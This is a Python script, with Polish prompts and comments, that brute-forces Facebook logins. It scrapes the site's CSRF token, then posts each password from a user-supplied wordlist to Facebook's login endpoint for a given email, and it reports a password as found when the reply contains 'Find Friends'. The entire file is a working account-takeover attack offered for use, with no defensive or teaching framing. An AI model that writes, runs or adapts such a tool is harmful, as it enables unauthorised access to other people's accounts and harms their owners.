import requests
from bs4 import BeautifulSoup

def get_csrf_token(session):
    home_url = "https://www.facebook.com"
    response = session.get(home_url)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "fb_dtsg"})
    if csrf_token:
        csrf_token = csrf_token["value"]
    return csrf_token

def brute_force(email, fb_id, passwords):
    login_url = "https://www.facebook.com/login.php"
    session = requests.Session()

    # Uzyskaj CSRF token
    csrf_token = get_csrf_token(session)
    if not csrf_token:
        print("Nie udało się uzyskać tokenu CSRF.")
        return

    for password in passwords:
        data = {
            "email": email,
            "pass": password,
            "fb_dtsg": csrf_token
        }
        headers = {
            "Referer": "https://www.facebook.com/",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        response = session.post(login_url, data=data, headers=headers)
        print(response.text)  # Debugging line to print response content

        if "Find Friends" in response.text:
            print(f"Hasło znalezione: {password}")
            break
        else:
            print(f"Błędne hasło: {password}")

if __name__ == "__main__":
    email = input("Podaj adres e-mail (jako nazwę użytkownika): ")
    fb_id = input("Podaj identyfikator Facebooka: ")
    password_file = input("Podaj nazwę pliku z hasłami: ")

    with open(password_file, "r") as file:
        passwords = file.read().splitlines()

    brute_force(email, fb_id, passwords)
